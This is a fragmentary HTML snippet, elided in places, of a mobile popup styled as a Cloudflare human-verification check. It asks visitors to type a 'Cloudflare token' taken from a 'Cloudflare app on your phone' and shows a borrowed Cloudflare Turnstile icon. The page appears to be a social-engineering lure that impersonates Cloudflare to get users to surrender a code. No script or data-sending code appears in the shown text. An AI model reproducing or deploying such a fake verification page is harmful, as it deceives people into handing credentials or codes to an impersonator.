...
<div class="popup_mobile" id="popup_mobile">
    ...
    ">
        <div class="popup_mobile-header">
            ...
            <h2 class="popup_mobile-h2" style="
                font-size: 9px;
            ">Verify you are human.</h2>
        </div>
        <p class="popup_mobile-p" style="
            font-size: 13px;
        ">Enter your Cloudflare token below to continue.</p>
        <div class="popup_mobile-input-container">
            <input type="text" id="token" placeholder="Enter your token" aria-label="Token input" style="
                font-size: 14px;
            ">
            <img class="input-icon" src="https://storage.googleapis.com/firebase-extensions-icons/extension_icons/cloudflare/cloudflare-turnstile-app-check-provider_0.1.0@512.png" alt="Icon" aria-hidden="true" style="
                width: 16px;
                height: 16px;
            ">
        </div>
        <p class="popup_mobile-note" style="
            font-size: 10px;
            margin-bottom: 5px;
            color: #fbad41;
        ">Open the Cloudflare app on your phone and enter the verification token above.</p>
        <button class="popup_mobile-button" style="
		...
		<div class="popup_mobile-instruction" style="padding-bottom: 10px;">
			...
			<div class="popup_mobile-help">
				<p style="font-size: 12px; margin-top: 10px; color: #333;">
